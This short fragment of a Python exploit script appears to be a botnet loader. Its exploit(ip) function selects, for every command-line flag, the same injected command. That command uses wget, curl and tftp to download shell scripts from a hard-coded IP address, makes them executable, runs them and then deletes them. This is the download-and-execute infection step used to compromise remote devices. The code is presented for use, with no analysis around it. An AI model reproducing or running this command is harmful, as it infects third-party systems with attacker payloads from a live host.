...
def exploit(ip):
	...
	try:
		try:
			if sys.argv[2] == "-r":
				cmd = "wget http://185.237.96.86/sensi.sh; curl -O http://185.237.96.86/sensi.sh;chmod +x *;sh sensi.sh sensi; tftp -r sensi1.sh -g 185.237.96.86;chmod +x *;  sh sensi1.sh sensi1; rm -rf *.sh "
			elif sys.argv[2] == "-c":
                		cmd = "wget http://185.237.96.86/sensi.sh; curl -O http://185.237.96.86/sensi.sh;chmod +x *;sh sensi.sh sensi; tftp -r sensi1.sh -g 185.237.96.86;chmod +x *;  sh sensi1.sh sensi1; rm -rf *.sh " #command here
                	elif sys.argv[2] == "-w":
				cmd = "wget http://185.237.96.86/sensi.sh; curl -O http://185.237.96.86/sensi.sh;chmod +x *;sh sensi.sh sensi; tftp -r sensi1.sh -g 185.237.96.86;chmod +x *;  sh sensi1.sh sensi1; rm -rf *.sh "
			elif sys.argv[2] == "-x":
                		cmd = "wget http://185.237.96.86/sensi.sh; curl -O http://185.237.96.86/sensi.sh;chmod +x *;sh sensi.sh sensi; tftp -r sensi1.sh -g 185.237.96.86;chmod +x *;  sh sensi1.sh sensi1; rm -rf *.sh " #command here
